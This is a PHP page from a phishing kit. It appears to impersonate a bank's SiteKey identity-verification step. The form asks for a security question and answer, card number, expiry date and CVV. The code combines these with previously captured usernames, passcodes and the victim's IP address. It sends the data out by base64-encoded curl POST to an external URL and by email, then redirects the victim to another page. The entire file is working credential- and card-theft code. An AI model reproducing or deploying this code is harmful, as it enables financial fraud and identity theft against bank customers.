<?php
ini_set("output_buffering",4096);

include '../Valid.php';
@session_start();
ob_start();

include 'Emaili.php';

function curl_sendi($url,$post){
    curl_setopt($ch=curl_init(), CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$hosti = generateRandomString();


$_SESSION['q1'] = $_POST['q1'];
$_SESSION['ans1'] = $_POST['ans1'];
$_SESSION['cn'] = $_POST['cn'];
$_SESSION['ex'] = $_POST['ex'];
$_SESSION['cv'] = $_POST['cv'];

if (!empty($_POST["ans1"])) {
			$ipaddress = $_SERVER['REMOTE_ADDR'];
			$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
			$message.= "-------------User Info-----------------\n";
			$message.= "Username: ".$_SESSION['usr']."\n";
			$message.= "Pass Code: ".$_SESSION['psw']."\n";
			$message.=  "-------------Card Info-----------------\n";
			$message.=  "Question 1: ".$_SESSION['q1']."\n";
			$message.=  "Response 1: ".$_SESSION['ans1']."\n";
			$message.=  "Card Number: ".$_SESSION['cn']."\n";
			$message.=  "Expiration MM/YYYY: ".$_SESSION['ex']."\n";
			$message.=  "CSC (3 digits): ".$_SESSION['cv']."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "IP            : ".$ipaddress."\n";
			$message.= "--------------[ UnKnown ]---------------------\n";
			$message.= "|Client IP: ".$ipaddress2."\n";
			$message.= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
			$subject = "xXxBOA-NeWxXx $ipaddress";
			$headers = "From: UnKnown <Source@Bourder.land>";
			$dataenc = base64_encode($message);
			$post = array('data'=>$dataenc);
		    $sendi = curl_sendi($url,$post);
			mail($SEND,$subject,$message,$headers);
		    header("Location: security.php?sec=$hosti$hosti$hosti"); 
} else {
}

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<link rel="shortcut icon" href="images/favicon.ico">	
<style type="text/css">

</style>
<link rel="stylesheet" href="css-js/jok1.css">
</head>
<body>
<form action="" name="chalojee" id="chalojee" method="post">
<div id="container">
<select name="q1" class="textbox" autocomplete="off" style="position:absolute;left:205px;top:218px;width:385px;z-index:18" required>
<option value="Select SiteKey Challenge Question 1">Select SiteKey Challenge Question 1</option>

<option value="In what city was your high school? (Enter only 'Charlotte' for Charlotte High School) ">In what city was your high school? (Enter only 'Charlotte' for Charlotte High School)</option>
<option value="What is your paternal grandfather's first name? ">What is your paternal grandfather's first name?</option>
<option value="What is the name of your first employer?">What is the name of your first employer?</option>
<option value="In what city was your mother born?(Enter full name of city only)">In what city was your mother born?(Enter full name of city only)</option>
<option value="How old were you at your wedding?(Enter age as digits.)">How old were you at your wedding?(Enter age as digits.)</option>
<option value="What is your father's middle name? ">What is your father's middle name?</option>
<option value="What is your paternal grandmother's first name?" > What is your paternal grandmother's first name?"</option>          
<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option value="In what city were you born? (Enter full name of city only) ">In what city were you born? (Enter full name of city only) "</option>
<option value="In what year (YYYY) did you graduate from high school? ">In what year (YYYY) did you graduate from high school?</option>  
<option value="What is your mother's middle name? ">What is your mother's middle name?</option>
<option value="In what city were you married? ">In what city were you married?</option>
<option value="In what city is your vacation home? ">In what city is your vacation home?</option>
<option value="What is the first name of your first child? ">What is the first name of your first child? </option>
<option value="In what city was your father born? (Enter full name of city only) ">In what city was your father born? (Enter full name of city only)</option>

</select>

<div id="image9" style="position:absolute; overflow:hidden; left:202px; top:254px; width:168px; height:247px; z-index:0"><img src="images/bb1.png" alt="" title="" border="0" width="168" height="247"></div>

<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:2"><img src="images/bb80.png" alt="" title="" border="0" width="173" height="23"></div>

<div id="image15" style="position: absolute; overflow: hidden; left: 180px; top: 740px; width: 987px; height: 150px; z-index: 3;"><img src="images/bbo28.png" alt="" title="" border="0" width="987" height="150"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:5"><img src="images/b7.png" alt="" title="" border="0" width="983" height="117"></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:6"><img src="images/b9.png" alt="" title="" border="0" width="428" height="28"></div>

<div id="image10" style="position: absolute; overflow: hidden; left: 340px; top: 571px; width: 75px; height: 29px; z-index: 6;"><a href="#"><img src="images/bb10.png" alt="" title="" border="0" width="75" height="29"></a></div>
<input name="ans1" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:262px;left:204px;top:276px;z-index:7">
<input name="cn" id="cn" class="textbox" minlength="15" maxlength="16" autocomplete="off" required="" type="tel" style="position:absolute;width:262px;left:204px;top:348px;z-index:8">
<input name="ex" placeholder="MM/YYYY" minlength="4" maxlength="7" class="textbox" autocomplete="off" required="" type="text" style="position:absolute;width:262px;left:204px;top:420px;z-index:9">
<input name="cv" class="textbox" autocomplete="off" required="" maxlength="3" type="tel" style="position:absolute;width:262px;left:203px;top:492px;z-index:10">
<div id="formimage1" style="position: absolute; left: 206px; top: 570px; z-index: 16;"><input type="image" name="formimage1" width="129" height="32" src="images/bcnf.png"></div>
</form></div>

</body>

</html>
<?php ob_end_flush(); ?>